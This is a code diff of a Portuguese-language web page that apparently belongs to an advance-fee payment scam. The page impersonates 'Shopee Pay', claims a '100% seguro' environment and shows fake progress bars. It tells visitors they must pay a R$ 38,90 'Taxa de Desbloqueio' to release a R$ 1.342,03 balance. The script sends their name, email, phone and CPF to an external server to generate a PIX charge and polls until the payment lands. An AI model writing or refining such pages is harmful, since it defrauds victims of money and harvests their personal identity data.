@@ -3,112 +3,183 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-    /* ESTILOS ORIGINAIS INTACTOS */
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
-    .button-container { display: flex; justify-content: center; align-items: center; width: 100%; padding: 20px; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
     
-    .btn-resgatar {
-        background: #FF5F2C; color: white; border: none; width: 100%; max-width: 380px; 
-        padding: 25px 20px; font-size: 22px; font-weight: 900; text-transform: uppercase;
-        border-radius: 12px; cursor: pointer; box-shadow: 0 8px 0 #d1491f, 0 15px 20px rgba(0,0,0,0.2);
-        transition: all 0.1s; position: relative; top: 0; animation: pulse-orange 2s infinite;
+    /* ESTILO DA PÁGINA (IDÊNTICO AO SEU PRINT) */
+    .iof-container {
+        max-width: 450px;
+        margin: 0 auto;
+        padding: 25px 20px;
+        background: #fff;
+        border-left: 8px solid #f05a28; /* Borda laranja lateral */
+        border-right: 8px solid #f05a28;
     }
-    .btn-resgatar:active { top: 8px; box-shadow: 0 0 0 #d1491f, 0 0 0 rgba(0,0,0,0); }
-    .btn-resgatar:disabled { background: #ccc; box-shadow: none; top: 0; animation: none; cursor: wait; }
+    .iof-title { font-size: 20px; color: #333; margin-bottom: 10px; font-weight: 700; }
+    .iof-desc { font-size: 13px; color: #666; margin-bottom: 20px; line-height: 1.4; }
     
-    @keyframes pulse-orange {
-        0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 95, 44, 0.7); }
-        70% { transform: scale(1.02); box-shadow: 0 0 0 15px rgba(255, 95, 44, 0); }
-        100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 95, 44, 0); }
-    }
+    /* BARRA DE PROGRESSO */
+    .progress-section { display: flex; justify-content: space-between; font-size: 11px; font-weight: 700; margin-bottom: 5px; }
+    .text-green { color: #28a745; }
+    .text-orange { color: #f05a28; }
+    .progress-bar-container { display: flex; height: 6px; background: #eee; border-radius: 4px; margin-bottom: 25px; overflow: hidden; }
+    .progress-bar-fill { width: 50%; background: #f05a28; }
+    
+    /* FORMULÁRIO */
+    .form-group { margin-bottom: 15px; text-align: left; }
+    .form-group label { display: block; font-size: 12px; color: #333; font-weight: 700; margin-bottom: 5px; }
+    .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; color: #333; background: #fff; outline: none; }
+    
+    /* CAIXA DE RESUMO */
+    .summary-box { border: 1px dashed #ccc; border-radius: 8px; padding: 15px; margin-bottom: 20px; background: #fafafa; }
+    .summary-title { text-align: right; font-size: 13px; font-weight: 700; margin-bottom: 10px; }
+    .summary-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 15px; align-items: center; }
+    .summary-calc { color: #28a745; font-weight: 700; font-size: 12px; text-align: right; line-height: 1.4; }
+    .summary-total { display: flex; justify-content: space-between; border-top: 1px dashed #ccc; padding-top: 15px; font-size: 14px; color: #666; align-items: center; }
+    .total-price { font-size: 18px; font-weight: 700; color: #333; }
+    
+    /* BOTÃO FINALIZAR */
+    .btn-finalizar { background: #f05a28; color: white; border: none; width: 100%; padding: 18px; font-size: 16px; font-weight: 700; border-radius: 6px; cursor: pointer; text-transform: uppercase; margin-bottom: 15px; transition: background 0.3s; }
+    .btn-finalizar:active { background: #d1491f; }
+    .btn-finalizar:disabled { background: #ccc; cursor: wait; }
+    .safe-env { text-align: center; font-size: 11px; color: #888; }
+    .safe-env img { width: 10px; margin-right: 5px; }
 
-    /* Modal Original */
-    .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 9998; backdrop-filter: blur(5px); }
-    .modal-pix { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); z-index: 9999; text-align: center; width: 90%; max-width: 400px; }
-    #qr_code_div img { margin: 20px auto; border-radius: 10px; max-width: 100%; border: 2px solid #eee; }
-    .btn-copiar { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 50px; font-weight: 700; font-size: 16px; margin-top: 15px; cursor: pointer; }
+    /* MODAL DO PIX */
+    .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9998; }
+    .modal-pix { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); z-index: 9999; text-align: center; width: 90%; max-width: 380px; }
+    .modal-pix h3 { color: #28a745; margin-bottom: 5px; font-size: 18px; }
+    .modal-pix p { color: #666; font-size: 13px; margin-bottom: 15px; }
+    #qr_code_div img { width: 200px; height: 200px; margin: 0 auto 15px auto; border-radius: 8px; border: 1px solid #eee; padding: 5px; }
+    .input-copia { width: 100%; padding: 12px; background: #f4f5f7; border: 1px solid #ddd; border-radius: 6px; font-size: 12px; color: #555; margin-bottom: 15px; outline: none; }
+    .btn-copiar { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 30px; font-weight: 700; cursor: pointer; }
 </style>
 </head>
 <body>
 
-<div class="button-container">
-    <button id="btn_pagar" class="btn-resgatar" onclick="gerarPix()">
-        RESGATAR R$ 1.342,03
-    </button>
+<div class="iof-container">
+    <h2 class="iof-title">Confirmação final do pedido</h2>
+    <p class="iof-desc">Seus dados foram verificados com sucesso. Para concluir a solicitação, confirme seus dados e finalize o pagamento abaixo.</p>
+
+    <div class="progress-section">
+        <span>VERIFICAÇÃO DE DADOS</span>
+        <span class="text-green">CONCLUÍDO</span>
+    </div>
+    <div class="progress-bar-container">
+        <div class="progress-bar-fill"></div>
+    </div>
+    <div class="progress-section">
+        <span>ANTECIPAÇÃO DE SAQUE</span>
+        <span class="text-orange">PENDENTE</span>
+    </div>
+
+    <div class="form-group">
+        <label>Nome Completo</label>
+        <input type="text" id="iof_nome" readonly>
+    </div>
+    <div class="form-group">
+        <label>E-mail</label>
+        <input type="text" id="iof_email" readonly>
+    </div>
+    <div class="form-group">
+        <label>Celular</label>
+        <input type="text" id="iof_phone" readonly>
+    </div>
+    <div class="form-group">
+        <label>CPF (Apenas números)</label>
+        <input type="text" id="iof_cpf" readonly>
+    </div>
+
+    <div class="summary-box">
+        <div class="summary-title">Taxa de Desbloqueio</div>
+        <div class="summary-row">
+            <span style="color: #666;">Saldo a<br>liberar:</span>
+            <span class="summary-calc">R$ 1.342,03 + 27,90 + 38,90 = R$<br>1.408,83</span>
+        </div>
+        <div class="summary-total">
+            <span>Total a pagar</span>
+            <span class="total-price">R$ 38,90</span>
+        </div>
+    </div>
+
+    <button id="btn_pagar" class="btn-finalizar" onclick="gerarPixIOF()">FINALIZAR PAGAMENTO</button>
+    
+    <div class="safe-env">
+        🔒 Ambiente 100% seguro | Shopee Pay
+    </div>
 </div>
 
 <div class="overlay" id="overlay"></div>
 <div class="modal-pix" id="modal_pix">
-    <h3 style="color:#333; margin-bottom:5px;">✅ QR CODE GERADO</h3>
-    <p style="color:#666; font-size:13px; margin-bottom:15px;">Finalize o pagamento para liberar seu saque.</p>
-    <div id="qr_code_div"></div>
-    <textarea id="txt_codigo" style="width:100%; height:60px; margin-top:10px; background:#f5f5f5; border:1px solid #ddd; border-radius:8px; padding:10px; font-size:12px; color:#555;" readonly>Gerando PIX...</textarea>
-    <button class="btn-copiar" id="btn_copy" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
+    <h3>✅ QR CODE GERADO</h3>
+    <p>Finalize o pagamento para liberar seu saque.</p>
     
-    <p id="status_msg" style="font-size: 12px; color: #888; margin-top: 15px;">
-        Aguardando confirmação do banco...
-    </p>
+    <div id="qr_code_div">
+        <img id="img_qr" src="" alt="Gerando QR Code...">
+    </div>
+    
+    <input type="text" id="txt_codigo" class="input-copia" readonly value="Aguarde...">
+    
+    <button class="btn-copiar" id="btn_copy" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
+    <p id="status_msg" style="font-size: 12px; color: #888; margin-top: 15px;">Aguardando confirmação do banco...</p>
 </div>
 
 <script>
     // ==========================================================
-    // CONFIGURAÇÕES DO NOVO SERVIDOR
+    // CONFIGURAÇÕES DO SERVIDOR
     // ==========================================================
-    const API_URL = "https://checkoutfinal.onrender.com"; // Seu servidor atualizado
-    const PROXIMA_ETAPA = "https://SEU_SITE.com/pagina-final"; // 🔴 COLOQUE A PRÓXIMA PÁGINA AQUI
+    const API_URL = "https://checkoutfinal.onrender.com"; 
+    
+    // 🔴 COLOQUE AQUI O LINK DA SUA ÚLTIMA PÁGINA (Ex: Saque Realizado)
+    const PROXIMA_ETAPA = "https://SEU_SITE.com/pagina-final-concluida"; 
 
+    // Pega dados da URL para preencher os campos do formulário
     function getURLParameter(name) {
         const urlParams = new URLSearchParams(window.location.search);
         return urlParams.get(name);
     }
 
-    function gerarPix() {
+    // Preenche os campos assim que a página carrega
+    window.onload = function() {
+        document.getElementById("iof_nome").value = getURLParameter('nome') || "Cliente Resgate";
+        document.getElementById("iof_email").value = getURLParameter('email') || "cliente@email.com";
+        document.getElementById("iof_phone").value = getURLParameter('phone') || "(11) 99999-9999";
+        document.getElementById("iof_cpf").value = getURLParameter('cpf') || "00000000000";
+    };
+
+    function gerarPixIOF() {
         const btn = document.getElementById("btn_pagar");
         btn.innerHTML = "PROCESSANDO...";
         btn.disabled = true;
 
-        const urlNome = getURLParameter('nome');
-        const urlEmail = getURLParameter('email');
-        const urlPhone = getURLParameter('phone');
-        const urlCpf = getURLParameter('cpf');
+        // VALOR EXATO DO SEU PRINT PARA A VIZZION PAY
+        const payload = {
+            name: document.getElementById("iof_nome").value,
+            email: document.getElementById("iof_email").value,
+            phone: document.getElementById("iof_phone").value,
+            cpf: document.getElementById("iof_cpf").value,
+            valor: "38.90" 
+        };
 
-        const storedData = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
-
-        const finalNome = urlNome || storedData.nome || "Cliente Consumidor";
-        const finalEmail = urlEmail || storedData.email || "cliente@pagamento.com";
-        const finalPhone = urlPhone || storedData.telefone || "(11) 99999-9999";
-        const finalCpf = urlCpf || storedData.documento || storedData.cpf || "00000000000";
-
-        // CHAMA O SEU SERVIDOR NOVO
         fetch(`${API_URL}/pix`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ 
-                valor: "27.90", // Valor original mantido
-                name: finalNome,
-                email: finalEmail,
-                phone: finalPhone,
-                cpf: finalCpf
-            })
+            body: JSON.stringify(payload)
         })
         .then(res => res.json())
         .then(data => {
             if (data.success) {
-                // ABRE O SEU MODAL ORIGINAL
+                // ABRE A TELA ESCURA E O MODAL
                 document.getElementById("overlay").style.display = "block";
                 document.getElementById("modal_pix").style.display = "block";
                 
-                // PREENCHE OS DADOS
+                // PREENCHE QR CODE E CÓDIGO (À prova de falhas)
                 document.getElementById("txt_codigo").value = data.payload;
-
-                // QR CODE À PROVA DE FALHAS (A mesma solução que funcionou no index)
-                const qrDiv = document.getElementById("qr_code_div");
-                qrDiv.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.payload)}">`;
+                document.getElementById("img_qr").src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.payload)}`;
 
                 // ==========================================================
-                // 🔴 MONITORAMENTO DO CAUÊ (PULA DE PÁGINA AUTOMATICAMENTE)
+                // MONITORAMENTO (VERIFICA O PAGAMENTO E PULA DE PÁGINA)
                 // ==========================================================
                 const monitoramento = setInterval(() => {
                     fetch(`${API_URL}/check-status/${data.transactionId}`)
@@ -116,7 +187,7 @@
                     .then(resStatus => {
                         if(resStatus.paid === true) {
                             clearInterval(monitoramento);
-                            document.getElementById('status_msg').innerText = "🚀 Pagamento aprovado! Liberando saque...";
+                            document.getElementById('status_msg').innerText = "🚀 Pagamento aprovado! Finalizando...";
                             document.getElementById('status_msg').style.color = "#28a745";
                             document.getElementById('status_msg').style.fontWeight = "bold";
                             
@@ -129,15 +200,14 @@
                 }, 3000);
 
             } else {
-                alert("Erro: " + (data.message || "Tente novamente."));
-                btn.innerHTML = "RESGATAR R$ 1.342,03";
+                alert("Erro ao conectar com banco. Tente novamente.");
+                btn.innerHTML = "FINALIZAR PAGAMENTO";
                 btn.disabled = false;
             }
         })
         .catch(err => {
-            console.error(err);
-            alert("Erro de conexão.");
-            btn.innerHTML = "RESGATAR R$ 1.342,03";
+            alert("Erro de conexão com a internet.");
+            btn.innerHTML = "FINALIZAR PAGAMENTO";
             btn.disabled = false;
         });
     }
